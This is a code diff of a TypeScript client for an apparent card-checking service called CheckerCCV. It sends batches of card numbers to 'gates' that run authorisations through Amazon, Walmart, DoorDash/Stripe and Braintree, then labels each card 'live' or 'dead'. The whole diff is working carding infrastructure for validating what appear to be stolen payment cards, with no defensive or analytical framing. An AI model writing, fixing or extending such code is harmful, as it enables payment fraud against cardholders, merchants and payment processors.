@@ -24,29 +24,26 @@ const creds = () => {
   return { key, token };
 };
 
-async function call(url: string, body: Record<string, unknown>, method: "GET" | "POST" = "POST") {
+/** GET with Bearer token (used for check_credit.php and auth/gates.php) */
+async function callGet(url: string, params: Record<string, string | number> = {}) {
   const { token } = creds();
   let finalUrl = url;
-  const init: RequestInit = {
-    method,
+  const qs = new URLSearchParams();
+  for (const [k, v] of Object.entries(params)) {
+    if (v !== undefined && v !== null && v !== "") {
+      qs.set(k, String(v));
+    }
+  }
+  const s = qs.toString();
+  if (s) finalUrl = `${url}?${s}`;
+
+  const res = await fetch(finalUrl, {
+    method: "GET",
     headers: {
       Authorization: `Bearer ${token}`,
       Accept: "application/json",
     },
-  };
-  if (method === "GET") {
-    const qs = new URLSearchParams();
-    for (const [k, v] of Object.entries(body)) {
-      if (v === undefined || v === null || v === "") continue;
-      qs.set(k, Array.isArray(v) ? JSON.stringify(v) : String(v));
-    }
-    const s = qs.toString();
-    if (s) finalUrl = `${url}?${s}`;
-  } else {
-    (init.headers as Record<string, string>)["Content-Type"] = "application/json";
-    init.body = JSON.stringify(body);
-  }
-  const res = await fetch(finalUrl, init);
+  });
   const text = await res.text();
   let payload: unknown;
   try {
@@ -71,22 +68,51 @@ async function call(url: string, body: Record<string, unknown>, method: "GET" | 
   return payload;
 }
 
-/** New API is GET + Bearer only; fall back to legacy POST if GET is rejected. */
-async function callSmart(url: string, body: Record<string, unknown>) {
-  try {
-    return await call(url, body, "GET");
-  } catch (e) {
-    const m = e instanceof Error ? e.message : String(e);
-    if (/\b(404|405)\b/.test(m) || m.includes("checker_bad_response")) {
-      return await call(url, body, "POST");
+/** Form POST with Bearer token (used for tasks/create.php and tasks/result.php) */
+async function callFormPost(url: string, params: Record<string, string | number>) {
+  const { token } = creds();
+  const form = new URLSearchParams();
+  for (const [k, v] of Object.entries(params)) {
+    if (v !== undefined && v !== null && v !== "") {
+      form.set(k, String(v));
     }
-    throw e;
   }
+
+  const res = await fetch(url, {
+    method: "POST",
+    headers: {
+      Authorization: `Bearer ${token}`,
+      Accept: "application/json",
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: form.toString(),
+  });
+  const text = await res.text();
+  let payload: unknown;
+  try {
+    payload = JSON.parse(text);
+  } catch {
+    throw new Error(`checker_bad_response: HTTP ${res.status}`);
+  }
+  const obj = (payload ?? {}) as Record<string, unknown>;
+  const msg =
+    (typeof obj.msg === "string" && obj.msg) ||
+    (typeof obj.message === "string" && obj.message) ||
+    (typeof obj.error === "string" && obj.error) ||
+    "";
+  if (res.status >= 400) throw new Error(msg || `checker_http_${res.status}`);
+  const err = obj.errorCode;
+  if (err !== undefined && err !== null && err !== 0 && err !== "0") {
+    throw new Error(msg || `checker_error_${String(err)}`);
+  }
+  if (obj.status === "error" || obj.status === "fail" || obj.status === "failed") {
+    throw new Error(msg || "checker_failed");
+  }
+  return payload;
 }
 
 export async function checkCredit(): Promise<number> {
-  const { key } = creds();
-  const p = (await callSmart(`${API_BASE}/check_credit.php`, key ? { key } : {})) as {
+  const p = (await callGet(`${API_BASE}/check_credit.php`)) as {
     data?: { credit?: number };
   };
   return Number(p?.data?.credit ?? 0);
@@ -94,13 +120,13 @@ export async function checkCredit(): Promise<number> {
 
 /** Gates supported by CheckerCCV for this shop */
 export const GATE_CATALOG: CheckerGate[] = [
+  { id: "CCV_Braintree_Auth", description: "CCV Braintree Auth - Do not check same BIN", creditGate: 5, isEnabled: true },
   { id: "CCV_Amazon_Auth", description: "CCV Amazon US Auth", creditGate: 15, isEnabled: true },
   { id: "CCN_Amazon_Auth", description: "CCN Amazon Prime US Auth", creditGate: 15, isEnabled: true },
   { id: "CCN_Amazon_Auth_Logo", description: "CCN Amazon Auth Logo Bank - 3 Minutes", creditGate: 15, isEnabled: true },
   { id: "CCV_Academy_Auth", description: "CCV Academy Auth - Walmart.Com", creditGate: 12, isEnabled: true },
   { id: "CCV_Doordash_Auth", description: "CCV DoorDash Auth - Stripe", creditGate: 8, isEnabled: true },
   { id: "CCN_Doordash_Auth", description: "CCN DoorDash Auth - Stripe", creditGate: 8, isEnabled: true },
-  { id: "CCV_Braintree_Auth", description: "CCV Braintree Auth - Do not check same BIN", creditGate: 5, isEnabled: true },
 ];
 
 export async function listGates(enabledOnly = true): Promise<CheckerGate[]> {
@@ -110,8 +136,7 @@ export async function listGates(enabledOnly = true): Promise<CheckerGate[]> {
   }
 
   try {
-    const { key } = creds();
-    let p = (await callSmart(GATES_URL, key ? { key } : {})) as unknown;
+    let p = (await callGet(GATES_URL)) as unknown;
     if (p && typeof p === "object" && Array.isArray((p as { data?: unknown[] }).data)) {
       p = (p as { data: unknown[] }).data;
     }
@@ -135,8 +160,11 @@ export async function listGates(enabledOnly = true): Promise<CheckerGate[]> {
 }
 
 export async function createTask(gatecode: string, listcc: string[]) {
-  const { key } = creds();
-  const p = (await callSmart(`${API_BASE}/tasks/create.php`, { ...(key ? { key } : {}), gatecode, listcc })) as {
+  const cardsText = listcc.join("\n");
+  const p = (await callFormPost(`${API_BASE}/tasks/create.php`, {
+    gatecode,
+    listcc: cardsText,
+  })) as {
     task_id?: string;
   };
   if (!p?.task_id) throw new Error("checker_no_task_id");
@@ -148,7 +176,11 @@ export async function getResults(taskId: string, cursor = 0, limit = 500) {
   let raw: unknown;
   for (let attempt = 0; ; attempt++) {
     try {
-      raw = await callSmart(`${API_BASE}/tasks/result.php`, { task_id: taskId, cursor, limit });
+      raw = await callFormPost(`${API_BASE}/tasks/result.php`, {
+        task_id: taskId,
+        cursor,
+        limit,
+      });
       break;
     } catch (e) {
       const m = e instanceof Error ? e.message : String(e);
@@ -174,10 +206,6 @@ export async function getResults(taskId: string, cursor = 0, limit = 500) {
   };
 }
 
-/**
- * Highly accurate CheckerCCV verdict: analyzes category AND gateway message.
- * Correctly identifies Approved, Live, Charge, and Insufficient Funds (valid card).
- */
 export function verdict(category?: string, msg?: string): "live" | "dead" | null {
   const combined = `${category ?? ""} ${msg ?? ""}`.toLowerCase().trim();
   if (!combined) return null;
